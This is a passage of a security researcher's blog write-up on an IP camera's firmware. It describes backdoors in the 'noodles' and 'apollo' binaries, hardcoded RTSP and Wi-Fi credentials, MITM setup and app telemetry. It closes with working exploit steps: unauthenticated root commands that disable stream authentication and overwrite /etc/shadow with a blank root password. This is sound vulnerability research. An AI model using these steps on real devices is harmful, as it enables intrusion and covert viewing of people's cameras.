+</span></span><span style="display:flex;"><span>  666 root     97564 S    {ut_net_listen_p} ./apollo
+</span></span><span style="display:flex;"><span>  677 root     97564 S    {Cos_InetMgr} ./apollo
+</span></span><span style="display:flex;"><span>  689 root     97564 S    {HttpClientThrea} ./apollo
+</span></span><span style="display:flex;"><span>  702 root     97564 S    {zj_live_thread_} ./apollo
+</span></span><span style="display:flex;"><span>  703 root     97564 S    {zj_audio_thread} ./apollo
+</span></span><span style="display:flex;"><span>  704 root     97564 S    {zj_ptz_thread} ./apollo
+</span></span><span style="display:flex;"><span>  705 root     97564 S    {zj_sdchk_thread} ./apollo
+</span></span><span style="display:flex;"><span>  707 root     97564 S    {cfg_task} ./apollo
+</span></span><span style="display:flex;"><span>  708 root     97564 S    {TrasBaseProcThr} ./apollo
+</span></span><span style="display:flex;"><span>  709 root     97564 S    {TrasBaseSendThr} ./apollo
+</span></span><span style="display:flex;"><span>  710 root     97564 S    {TunnelRecvThrea} ./apollo
+</span></span><span style="display:flex;"><span>  711 root     97564 S    {LOGCOLLECT_TASK} ./apollo
+</span></span><span style="display:flex;"><span>  712 root     97564 S    {CloudMng} ./apollo
+</span></span><span style="display:flex;"><span>  713 root     97564 S    {cloud res} ./apollo
+</span></span><span style="display:flex;"><span>  714 root     97564 S    {CloudChan} ./apollo
+</span></span><span style="display:flex;"><span>  715 root     97564 S    {CloudExternChan} ./apollo
+</span></span><span style="display:flex;"><span>  716 root     97564 S    {AIIOT_TASK} ./apollo
+</span></span><span style="display:flex;"><span>  717 root     97564 S    {MSGCT_TASK} ./apollo
+</span></span><span style="display:flex;"><span>  718 root     97564 S    {cmd_task} ./apollo
+</span></span><span style="display:flex;"><span>  719 root     97564 S    {RF_TASK} ./apollo
+</span></span><span style="display:flex;"><span>  720 root     97564 S    {localio_task} ./apollo
+</span></span><span style="display:flex;"><span>  721 root     97564 S    {FileProc_SendTa} ./apollo
+</span></span><span style="display:flex;"><span>  722 root     97564 S    {FileProc_RecvTa} ./apollo
+</span></span><span style="display:flex;"><span>  729 root     97564 S    {ap_netstat_thre} ./apollo
+</span></span><span style="display:flex;"><span>  730 root     97564 S    {ap_ircut_switch} ./apollo
+</span></span><span style="display:flex;"><span>  533 root         0 SW   [RTW_CMD_THREAD]
+</span></span><span style="display:flex;"><span>  539 root      1948 S    /app/bin/wpa_supplicant -Dnl80211 -P/var/lock/wpa_su
+</span></span><span style="display:flex;"><span>  572 root      1596 S    noodles
+</span></span><span style="display:flex;"><span>  582 root      1596 S    {policy_thread} noodles
+</span></span><span style="display:flex;"><span>  583 root      1596 S    {multicast_threa} noodles
+</span></span><span style="display:flex;"><span>  573 root      1372 S    /sbin/inetd -f -e /etc/inetd.conf
+</span></span><span style="display:flex;"><span>  575 root      1380 S    init
+</span></span><span style="display:flex;"><span>  600 root         0 SW   [jpeg_kick]
+</span></span><span style="display:flex;"><span>  601 root         0 SW   [vpu_task]
+</span></span><span style="display:flex;"><span>  602 root         0 SW   [hhe_manage]
+</span></span><span style="display:flex;"><span>  627 root      1384 S    udhcpc -p /var/lock/udhcpc_wlan0.pid -t 30 -T 3 -b -
+</span></span><span style="display:flex;"><span>  762 root      1372 S    /sbin/telnetd -w10
+</span></span><span style="display:flex;"><span>  763 root      1388 S    -sh
+</span></span><span style="display:flex;"><span>  774 root         0 SW   [kworker/u2:2]
+</span></span><span style="display:flex;"><span>  791 root      1372 R    ps T
+</span></span></code></pre></div></details>
+<details>
+<summary>Show network sockets (netstat)</summary>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>[/]# netstat -alpt
+</span></span><span style="display:flex;"><span>Active Internet connections (servers and established)
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:6688            0.0.0.0:*               LISTEN      531/apollo
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:8554            0.0.0.0:*               LISTEN      531/apollo
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:843             0.0.0.0:*               LISTEN      573/noodles
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:1300            0.0.0.0:*               LISTEN      573/noodles
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      574/inetd
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:8699            0.0.0.0:*               LISTEN      531/apollo
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:16668           0.0.0.0:*               LISTEN      531/apollo
+</span></span><span style="display:flex;"><span>tcp        0      0 192.168.68.65:38534     193.41.40.34.bc.googleusercontent.com:25515 ESTABLISHED 531/apollo
+</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:16658           0.0.0.0:*                           531/apollo
+</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:3702            0.0.0.0:*                           531/apollo
+</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:5012            0.0.0.0:*                           573/noodles
+</span></span><span style="display:flex;"><span>Active UNIX domain sockets (servers and established)
+</span></span><span style="display:flex;"><span>Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
+</span></span><span style="display:flex;"><span>unix  2      [ ACC ]     STREAM     LISTENING       2117 482/dev_ctrl        @jdc_server
+</span></span><span style="display:flex;"><span>unix  2      [ ACC ]     STREAM     LISTENING       2348 531/apollo          @sd_event
+</span></span><span style="display:flex;"><span>unix  2      [ ACC ]     STREAM     LISTENING       2355 531/apollo          @jap_server
+</span></span><span style="display:flex;"><span>unix  2      [ ACC ]     STREAM     LISTENING       2118 482/dev_ctrl        @jsh_server
+</span></span><span style="display:flex;"><span>unix  2      [ ]         DGRAM                       812 100/udevd           @/org/kernel/udev/udevd
+</span></span><span style="display:flex;"><span>unix  2      [ ]         DGRAM                      2221 540/wpa_supplicant  /var/run/wpa_supplicant/wlan0
+</span></span></code></pre></div></details>
+<h2 id="initial-firmware-extraction-and-strings">Initial firmware extraction and strings.<a hidden class="anchor" aria-hidden="true" href="#initial-firmware-extraction-and-strings">#</a></h2>
+<p>After getting a working shell, I moved on to firmware extraction and static analysis of the extracted root filesystem and binaries.</p>
+<p>The most interesting targets were the running binaries. They handled cloud communication and listened on local ports — specifically apollo and noodles.</p>
+<p>I started with apollo, which is responsible for cloud connectivity and services such as RTSP and ONVIF. I fired up IDA and began digging…</p>
+<p>TL;DR: both main applications contain backdoors. One affects RTSP, and the other allows execution of system commands as root — without any authentication.</p>
+<p>Now all that remained was figuring out how to enable them and make them work for us.</p>
+<p>Some key findings that I found was:</p>
+<ul>
+<li>Hard-coded RTSP strings include <code>user=admin_password=tlJwpbo6</code> and stream variants(apollo app).</li>
+<li>Default services in config enable Telnet, RTSP, and ONVIF; the web UI is disabled.</li>
+<li>Default ports listed in <code>myinfo.sh</code> are RTSP 8554, ONVIF 6688.</li>
+<li>Factory AP defaults show SSID prefix <code>Care-AP</code> and key pass as <code>Aa12345678</code>.</li>
+<li>Noodles act like a Backdoor Service (executes commands as root).</li>
+</ul>
+<details>
+<summary>Apollo - Show IDA strings sweep for "admin"</summary>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>.rodata:002AE1A9 0000000E C Administrator
+</span></span><span style="display:flex;"><span>.rodata:002B169C 0000001D C user=admin_password=tlJwpbo6
+</span></span><span style="display:flex;"><span>.rodata:002B6904 00000006 C admin
+</span></span><span style="display:flex;"><span>.rodata:002BF1F4 00000006 C admin
+</span></span><span style="display:flex;"><span>.rodata:002C076B 00000006 C admin
+</span></span><span style="display:flex;"><span>.data:00342614   00000040 C user=admin_password=tlJwpbo6_channel=1_stream=0.sdp?real_stream
+</span></span><span style="display:flex;"><span>.data:00342654   00000040 C user=admin_password=tlJwpbo6_channel=1_stream=1.sdp?real_stream
+</span></span></code></pre></div></details>
+<details>
+<summary>Show rootfs scan highlights</summary>
+<p><strong>Interesting config</strong></p>
+<ul>
+<li>Telnet enabled plus ONVIF/RTSP enabled in <code>app.cfg</code></li>
+<li>Default service ports (http 80 / https 443 / rtsp 8554 / onvif 6688) in <code>myinfo.sh</code> overrides stored in <code>ipc.db</code>.</li>
+<li>SD card config injection paths for env and Wi-Fi in <code>app_config.sh</code></li>
+<li>TFTP upgrade flow in <code>iu.sh</code> server IP in <code>uboot_env</code></li>
+</ul>
+<p><strong>Custom binaries and scripts</strong></p>
+<ul>
+<li>Main app/control tooling in <code>/squashfs-root/abin/apollo</code>, <code>/squashfs-root/abin/dev_ctrl</code>, <code>/squashfs-root/abin/net_cfg</code>, <code>/squashfs-root/abin/noodles</code>, <code>/squashfs-root/abin/playaudio</code>.</li>
+<li>Firmware/env tooling in <code>/squashfs-root/bin/img_up</code>, <code>/squashfs-root/bin/apenv</code>, <code>/squashfs-root/bin/fw_printenv</code>, <code>/squashfs-root/bin/get_cfg</code>, <code>/squashfs-root/bin/db_get</code>.</li>
+<li>Wi-Fi test/control scripts in <code>/cli</code> and <code>/rf</code>.</li>
+</ul>
+<p><strong>Likely credential stores not yet extracted</strong></p>
+<ul>
+<li>Default DB used to seed admin info: <code>ipc_def.db</code></li>
+</ul>
+</details>
+<details>
+<summary>Show UPX detection and unpacking notes</summary>
+<p>The <code>apollo</code> binary was UPX-packed. <code>file apollo</code> (or binwalk) reports &ldquo;UPX compressed&rdquo;<br>
+Unpacking was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>upx -d apollo -o apollo.unpacked
+</span></span></code></pre></div><p>After unpacking, code and strings were readable and decompiling worked normally. <code>file apollo.unpacked</code> shows a regular ELF without the UPX note.</p>
+</details>
+<p><img alt="UPX Decompile" loading="lazy" src="/images/upx-find.png"></p>
+<details>
+<summary>Show apollo highlights and observations from IDA</summary>
+<p><strong>Quick config and value extracts</strong></p>
+<ul>
+<li><code>root:z1Y**********</code> (DES hash from shadow, system root account).</li>
+<li><code>telnetd=yes</code> (from <code>/app.cfg</code>, telnet default enabled).</li>
+<li><code>AP_ssid_prefix=Care-AP</code></li>
+<li><code>AP_key=Aa12345678</code> (default AP password noted in <code>ap_mode.cfg</code> context).</li>
+<li>App expects file in <code>/home/dis_onvif_auth</code> to enable hard-coded credentials for RTSP.</li>
+</ul>
+</details>
+<p><img alt="Enable RTSP and Test" loading="lazy" src="/images/rtsp-enable.png"></p>
+<p><em>Enable RTSP service by touching /home/dis_onvif_auth file</em></p>
+<details>
+<summary>Show noodles app highlights and observations from IDA</summary>
+<p><strong>Highlights</strong></p>
+<ul>
+<li>Target binary: <code>/squashfs-root/abin/noodles</code> (static ARM ELF).</li>
+<li>Main entry starts an unauthenticated TCP server on port 1300 and dispatches XML-like commands.</li>
+<li>Key handlers (all reachable without auth):
+<ul>
+<li><code>&lt;SYSTEM&gt;</code> → <code>cmd_system</code>: runs arbitrary shell.</li>
+<li><code>&lt;SYSTEMEX&gt;</code> → <code>cmd_system_ex</code>: runs a shell command and streams stdout (buggy 1024-byte ACK read).</li>
+<li><code>&lt;UPGRADE&gt;</code>, <code>&lt;DOWNLOAD&gt;</code>, <code>&lt;UPLOAD&gt;</code>, <code>&lt;FLASHDUMP&gt;</code>: full file transfer and upgrade paths.</li>
+<li><code>&lt;BURNMAC&gt;</code>, <code>&lt;BURNSN&gt;</code>, <code>&lt;WRITEENV&gt;</code>, <code>&lt;READENV&gt;</code>: write/read MAC, serial, and env keys; persist to <code>/home/*</code> and env.</li>
+<li><code>&lt;ELFEXEC&gt;</code>: download a binary, chmod +x, execute.</li>
+</ul>
+</li>
+<li>Auxiliary listeners/threads:
+<ul>
+<li>Flash policy server (ports 843 → fallback 8843) sends permissive cross-domain XML.</li>
+<li>UDP multicast responder on 224.0.0.111/ports 5012/7654, advertises device info and executes <code>&lt;YGMP_CMD&gt;</code> if target IP/MAC match.</li>
+</ul>
+</li>
+<li>No authentication or source filtering anywhere; all handlers run as root.</li>
+</ul>
+</details>
+<p><img alt="Noodle backdoor" loading="lazy" src="/images/noodle-backdoor.png">
+<em>Noodles backdoor</em></p>
+<h2 id="firmware-findings-deep-pass">Firmware Findings (Deep Pass)<a hidden class="anchor" aria-hidden="true" href="#firmware-findings-deep-pass">#</a></h2>
+<p>This section captures a deeper pass over the firmware and binary behavior.</p>
+<p>Key takeaways:</p>
+<ul>
+<li>Root hash <code>z1Y**********</code> is present; Telnet defaults are enabled; Wi-Fi STA creds live at runtime.</li>
+<li>Telnet/FTP toggles are gated by config DB keys, not just <code>app.cfg</code>.</li>
+<li>The license flow uses plaintext HTTP and writes QR content to <code>/home/qrcode</code>.</li>
+<li>Cloud traffic uses a custom encrypted message layer over TCP, with separate NAT/P2P flows.</li>
+<li>No obvious shell backdoor was found in cloud handlers.</li>
+</ul>
+<details>
+<summary>Show full firmware findings and function notes</summary>
+**System credentials and defaults**
+- System credential: `root:z1Y**********` (DES hash) in `shadow` and `squashfs-root/shadow`. No cleartext RTSP/ONVIF creds found.
+- Telnet default in config: `telnetd=yes` in `app.cfg` (and prodid variants).
+- FTP defaults: no `ftpd_enable` in `app.cfg`
+- Wi-Fi STA credentials are not in the readonly dump. They live at runtime in `ifcfg.wlan0` and `wpa_supplicant.conf`.
+</details>
+<h2 id="boot-flow-config-storage-and-devicecloud-profile">Boot Flow, Config Storage, and Device/Cloud Profile<a hidden class="anchor" aria-hidden="true" href="#boot-flow-config-storage-and-devicecloud-profile">#</a></h2>
+<p>This block captures the boot flow and on-disk configuration sources I mapped next.</p>
+<p>Summary:</p>
+<ul>
+<li>Boot chain is <code>app_init.sh</code> -&gt; <code>start.sh</code> -&gt; <code>abin/apollo</code>, with modules and SD update paths early in boot.</li>
+<li><code>ipc.db</code> and <code>systemcfg.db</code> store runtime config and identity; <code>app.cfg</code> and <code>board.cfg</code> describe features.</li>
+<li>Defaults include AP mode <code>Care-AP&lt;sn&gt;</code> with key <code>Aa12345678</code>, RTSP/ONVIF enabled, and web UI disabled.</li>
+<li>Cloud config points to <code>svr.smartcloudcon.com</code> with specific IDs, link servers, and tokens.</li>
+<li>Hardware profile shows FH8852V2X0, RTL8188FU/SSV6155P, PTZ, audio I/O, multiple sensors, and firmware <code>v220901.1359</code>.</li>
+</ul>
+<details>
+<summary>Show full boot and config notes</summary>
+<p><strong>Boot flow</strong>
+<code>app_init.sh</code> syncs U-Boot/apenv, mounts SD, loads kernel modules (<code>modules.sh</code>), copies <code>userdata/shadow</code> into <code>/etc</code>, then <code>start.sh</code> launches <code>abin/apollo</code> (UPX-unpacked copy included) and optional <code>cld_upd</code>/<code>andlink</code> before doing NTP sync.</p>
+<p><strong>Config storage</strong>
+<code>ipc.db</code> is the primary settings DB seeded/reset by <code>db_init.sh</code> if revisions differ; JSON configs in <code>*.db</code> hold cloud/IOT settings; <code>systemcfg.db</code> keeps identity/SignAddr; <code>app.cfg</code> (cloud/onvif/rtsp/telnet flags) and <code>board.cfg</code> (PTZ GPIO/PWM, audio, IR) describe capabilities.</p>
+<p><strong>Credentials in clear</strong>
+<code>userdata/shadow</code> sets root with no password (default hash in <code>/squashfs-root/shadow</code> is <code>root:z1Y**********</code> but overwritten at boot); Wi-Fi STA creds in <code>ifcfg.wlan0</code> (<code>MyTestWifi01</code> / <code>Mypassword1234</code>); provisioning AP in <code>ap_mode.cfg</code> uses SSID <code>Care-AP&lt;sn&gt;</code>, <code>auth=none</code>, key <code>Aa12345678</code>. IDA strings noted in <code>notes.txt</code>/<code>apollo_report.txt</code> show a hardcoded RTSP template <code>user=admin_password=tlJwpbo6</code>.</p>
+<p><strong>Services/protocols</strong>
+<code>app.cfg</code> enables <code>cloud_enable</code>, <code>cloud_zj</code>, <code>rtsp=yes</code> (audio on), <code>onvif=yes</code>, <code>telnetd=yes</code>, <code>web=no</code>. Default ports from <code>myinfo.sh</code> are HTTP 80, HTTPS 443, RTSP 8554, ONVIF 6688. Wi-Fi control uses <code>wifi_mode.sh</code> (wpa_supplicant/hostapd). NTP hits <code>cn.ntp.org.cn</code> and <code>time.windows.com</code>. PTZ is PWM-driven (<code>board.cfg</code>), with video pipeline tuned in <code>sysinfo/setting</code>.</p>
+<p><strong>Cloud and endpoints</strong>
+<code>systemcfg.db</code> points to <code>svr.smartcloudcon.com</code> with AppID <code>1657353*********</code>, CompanyID <code>0000213*********</code>, device DID <code>120001*********</code>. <code>corecfg.db</code> sets <code>linkIpv4 34.40.41.193</code>, <code>linkPort 25515</code>, <code>linkSrvid CPLink:20001-10-DE-20250911115034.449</code>, <code>LinkEncKey 132ded*********</code>, <code>LinkEncLoad dd06dc6*********</code>. <code>groupcfg.db</code> uses <code>Ipv4 130.162.37.6</code>, <code>Port 25006</code>, <code>ConnToken 10:BG:af2f5*********</code>, <code>OwnerToken 16000102c09471e*********</code>. Strings in <code>apollo_report.txt</code> also reference <code>cloud.ygtek.cn</code>.</p>
+<p><strong>Hardware/profile</strong>
+<code>userdata/hw_info</code> and <code>prodid/PQEW4-01/config/prod_info</code> show Fullhan FH8852V2X0 SoC, Wi-Fi RTL8188FU/SSV6155P, PTZ present, audio in/out, sensors <code>sc3338_mipi</code>/<code>gc4653</code>/<code>gc3003</code>, firmware <code>fw_ver v220901.1359</code>, timezone set to EET (<code>devcfg.db</code>).</p>
+</details>
+<h2 id="mitm-setup-for-camera-traffic">MITM Setup for Camera Traffic<a hidden class="anchor" aria-hidden="true" href="#mitm-setup-for-camera-traffic">#</a></h2>
+<p>I ran a MITM attack from my laptop over a LAN RJ45 connection, using the laptop as a proxy through eth0.</p>
+<p>I also set up Burp Suite as a MITM proxy, but no HTTP or HTTPS traffic — with or without TLS — was observed during the actual communication.</p>
+<details>
+<summary>Show MITM setup commands</summary>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#Start DNS and DHCP.</span>
+</span></span><span style="display:flex;"><span>sudo dnsmasq -i enxc8a362b69fba <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--dhcp-range<span style="color:#f92672">=</span>192.168.10.50,192.168.10.100,12h <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--dhcp-option<span style="color:#f92672">=</span>option:router,192.168.10.1 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--dhcp-option<span style="color:#f92672">=</span>option:dns-server,8.8.8.8 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enable routing.</span>
+</span></span><span style="display:flex;"><span>sudo sysctl -w net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Basic NAT so the camera can reach the web...</span>
+</span></span><span style="display:flex;"><span>sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+</span></span><span style="display:flex;"><span>sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+</span></span><span style="display:flex;"><span>sudo iptables -A FORWARD -i enxc8a362b69fba -o wlan0 -j ACCEPT
+</span></span></code></pre></div></details>
+<ul>
+<li>ARP broadcasts on /24 at boot:
+In these captures also, the camera does DHCP and sends SSDP M-SEARCH; ARP broadcasts appear during the same startup window.</li>
+</ul>
+<details>
+<summary>Network traffic observations</summary>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>- On boot, camera opens TCP to 34.40.41.193 <span style="color:#f92672">(</span>line 25515<span style="color:#f92672">)</span> and sends only a small JSON control message; no user data observed. Example frame <span style="color:#ae81ff">1</span> payload: <span style="color:#e6db74">`</span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;METHOD&#34;</span>:<span style="color:#e6db74">&#34;0000&#34;</span>,<span style="color:#e6db74">&#34;SEQID&#34;</span>:<span style="color:#e6db74">&#34;3985029&#34;</span><span style="color:#f92672">}</span><span style="color:#e6db74">`</span>. No private info beyond a sequence ID.
+</span></span><span style="display:flex;"><span>- P2P bootstrap over UDP to 158.101.162.17 / 130.162.37.6. Messages are cleartext and include the camera<span style="color:#960050;background-color:#1e0010">&#39;</span>s public IP/port. Example: frame <span style="color:#ae81ff">1002</span> <span style="color:#e6db74">`</span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;METHOD&#34;</span>:<span style="color:#e6db74">&#34;201A&#34;</span>,<span style="color:#e6db74">&#34;SEQID&#34;</span>:<span style="color:#e6db74">&#34;2109&#34;</span>,<span style="color:#e6db74">&#34;BODY&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;SvrToken&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">}}</span><span style="color:#e6db74">`</span> from 192.168.10.69 <span style="color:#f92672">(</span>line 7171<span style="color:#f92672">)</span> to 130.162.37.6 <span style="color:#f92672">(</span>line 30194<span style="color:#f92672">)</span>; frame <span style="color:#ae81ff">1005</span> reply <span style="color:#e6db74">`</span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;METHOD&#34;</span>:<span style="color:#e6db74">&#34;201B&#34;</span>,<span style="color:#e6db74">&#34;CODE&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;BODY&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;NatIP&#34;</span>:<span style="color:#e6db74">&#34;151.237.67.245&#34;</span>,<span style="color:#e6db74">&#34;Port&#34;</span>:<span style="color:#e6db74">&#34;7171&#34;</span><span style="color:#f92672">}}</span><span style="color:#e6db74">`</span>.
+</span></span><span style="display:flex;"><span>- After NAT bootstrap, large UDP between camera 192.168.10.69 <span style="color:#f92672">(</span>line 7171<span style="color:#f92672">)</span> and phone 192.168.68.78 <span style="color:#f92672">(</span>line 7195<span style="color:#f92672">)</span>; payload not decrypted in current capture.
+</span></span><span style="display:flex;"><span>- App TLS sessions to <span style="color:#e6db74">`</span>ims.smartcloudcon.com<span style="color:#e6db74">`</span> observed, but payload encrypted; plain HTTP requests go to MOB/analytics <span style="color:#f92672">(</span><span style="color:#e6db74">`</span>cfgc.zztfly.com<span style="color:#e6db74">`</span>, <span style="color:#e6db74">`</span>api-share.mob.com<span style="color:#e6db74">`</span>, <span style="color:#e6db74">`</span>errc.zztfly.com<span style="color:#e6db74">`</span><span style="color:#f92672">)</span>, not directly tied to camera state.
+</span></span></code></pre></div></details>
+<h2 id="app-and-camera-data-collection-findings">App and Camera Data Collection Findings<a hidden class="anchor" aria-hidden="true" href="#app-and-camera-data-collection-findings">#</a></h2>
+<p>I also reversed the Android app and captured traffic from both the device and the application itself.</p>
+<p>Based on Frida HTTP logs and API dumps, here’s what the app and the camera appear to collect and transmit.</p>
+<p>Summary:</p>
+<ul>
+<li>Persistent user IDs and session tokens are attached to most app calls.</li>
+<li>The camera DID is used as <code>deviceId</code> in cloud and purchase flows.</li>
+<li>Analytics events and app usage telemetry go to <code>beimei-loggw.smartcloudcon.com</code>.</li>
+<li>Ad and promo endpoints collect device/app metadata and return ad inventory.</li>
+<li>Cloud package and purchase endpoints expose product catalogs tied to the device.</li>
+<li>Account linking endpoints exist for Alexa/GHA integrations.</li>
+</ul>
+<details>
+<summary>Show full data collection breakdown</summary>
+<p><strong>Telemetry/analytics</strong></p>
+<ul>
+<li>Event tracking to <code>beimei-loggw.smartcloudcon.com/loggw/app/eventTrack/</code></li>
+<li>Captures app usage flow and device interactions (enter live view, playback, exit).</li>
+<li>Permissions: camera, mic, fine/coarse/NEARBY_WIFI_DEVICES, storage, overlay (SYSTEM_ALERT_WINDOW), notifications, ad IDs, billing/licensing, boot, kill background.</li>
+<li>Exported components: deep link <code>hm://app.smartcloudcon.com/</code> (CareMainActivity), WXPay, GIF push activity, push services/receivers for Huawei/OPPO/FCM/Xiaomi/Vivo/GeTui, file providers.</li>
+<li>Endpoints/domains: <code>svr.smartcloudcon.com</code>, <code>exsvr.smartcloudcon.com</code>, <code>websvr.smartcloudcon.com</code>, <code>exwebsvr.smartcloudcon.com</code>, console <code>console.smartcloudcon.com</code>, logs <code>ims.smartcloudcon.com</code>, test hosts <code>testweb.smartcloudcon.com</code>, <code>testsvr.smartcloudcon.com</code>, legacy IP hints <code>http://139.159.243.73:8099/9003</code>, deep link <code>app.smartcloudcon.com</code>. Other hosts: <code>im-hw.7x24cc.com</code>, <code>im5fa212f.7x24cc.com</code>, <code>globalh5.crosssim.com</code>, <code>cfgc.zztfly.com</code>, <code>errc.zztfly.com</code>, <code>api-share.mob.com</code>, <code>hmstatic-1311597033.cos.ap-nanjing.myqcloud.com</code>.</li>
+</ul>
+<p><strong>Ads and personalization</strong></p>
+<ul>
+<li>Ad requests to <code>exsvr.smartcloudcon.com/carewebin/store/getadlist/v2</code></li>
+</ul>
+<p><strong>Cloud packages/purchases</strong></p>
+<ul>
+<li>Cloud package catalogs (<code>store/promotegoods</code>, <code>goodscollection</code>) fetched with uid, deviceId, and app info. Contains product IDs (Google Play SKUs), prices, recording templates (e.g., days of storage, continuous vs event-based), and eligibility flags.</li>
+<li>Purchase flows (<code>prepaidorder</code>, <code>queryLatestUnpaidOrder</code>) include uid, utoken, deviceId, goodsId, payType, serviceid, uniqueid; tests returned errors.</li>
+</ul>
+<p><strong>Menus/feature links</strong></p>
+<ul>
+<li>Menus include links to cloud packages, voice assistant integration, no ads, AI alarm, offline monitor, payment pages, pulled via <code>GetAppMenus</code>.</li>
+</ul>
+</details>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>In the end, we achieved a fully working exploit. If an attacker has LAN access to the device, it can be exploited very easily due to the multiple backdoors embedded in the camera.</p>
+<p>A possible next step for an attacker would be to compile additional tools for the device — such as Responder, NetExec, or even an SSH server — and use it as a pivot point. But that’s a topic for another discussion.</p>
+<p>We also recovered the Wi-Fi credentials in plain text. This means that even with only LAN access, it’s possible to extract the Wi-Fi password if the camera is connected wirelessly.</p>
+<p>Based on all the information above, I can conclude that my alerts were triggered by built-in features of the camera — not by someone “sitting in a dark room.”</p>
+<p>However, given the number of embedded backdoors, the manufacturer could easily enable remote access via the cloud, so this possibility cannot be ruled out. If someone were to crack the shadow file, compromising the camera would become even easier.</p>
+<p>I attempted to contact the vendor, but without success. The camera uses an app called “CareCamPro”, but the app developers told me that the camera manufacturer merely borrowed their application.</p>
+<h2 id="how-we-leveraged-it-telnet--rtsp">How we leveraged it (telnet + RTSP)<a hidden class="anchor" aria-hidden="true" href="#how-we-leveraged-it-telnet--rtsp">#</a></h2>
+<ol>
+<li>
+<p><strong>Disable RTSP/ONVIF auth gate</strong></p>
+<ul>
+<li><code>noodles</code> runs as root and accepts <code>&lt;SYSTEM&gt;</code>; we used it to create <code>/home/dis_onvif_auth</code>, which prevents the RTSP auth initializer from running (seen in <code>apollo</code> RTSP code: <code>load_rtsp_auth</code> is skipped if this file exists).</li>
+<li>Command: <code>&lt;SYSTEM&gt;touch /home/dis_onvif_auth&lt;/SYSTEM&gt;</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Insert blank root password for telnet</strong></p>
+<ul>
+<li><code>noodles</code> can append to <code>/etc/shadow</code>; telnetd reads this file.</li>
+<li>Command: <code>&lt;SYSTEM&gt;echo &quot;root::18622:0:99999:7:::&quot; &gt; /etc/shadow&lt;/SYSTEM&gt;</code> writes a blank-password root entry.</li>
+<li>After that, telnet login as <code>root</code> with empty password succeeds.</li>
+</ul>
+</li>
+<li>
+<p><strong>RTSP viewing</strong></p>
+<ul>
+<li>With auth disabled, RTSP accepts <code>/profile0</code> on port 8554.</li>
+<li>Verified stream: <code>mpv &quot;rtsp://admin:tlJwpbo6@&lt;cam_ip&gt;:8554/profile0&quot;</code> (the admin/tlJwpbo6 pair also appears as a hardcoded URI bypass string in RTSP parser).</li>
+</ul>
+</li>
+<li>
+<p><strong>Scripted workflow</strong> (<code>cam-exploit.py</code>)</p>
+<ul>
+<li>Sends the two SYSTEM commands above (create <code>/home/dis_onvif_auth</code>, append shadow line).</li>
+<li>Telnet probe via <code>telnetlib</code> for root/blank on port 23; prints green success on OK.</li>
+</ul>
+</li>
+</ol>
+<p><em>Working RTSP test:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>mpv &#34;rtsp://admin:tlJwpbo6@192.168.68.78:8554/profile0&#34;
+</span></span></code></pre></div><p><em>Auth bypass script used at exploit:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>touch /home/dis_onvif_auth
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;root::18622:0:99999:7:::&#34;</span> &gt; /etc/shadow
+</span></span></code></pre></div><p>Combine all together in one:</p>
+<video controls width="100%">
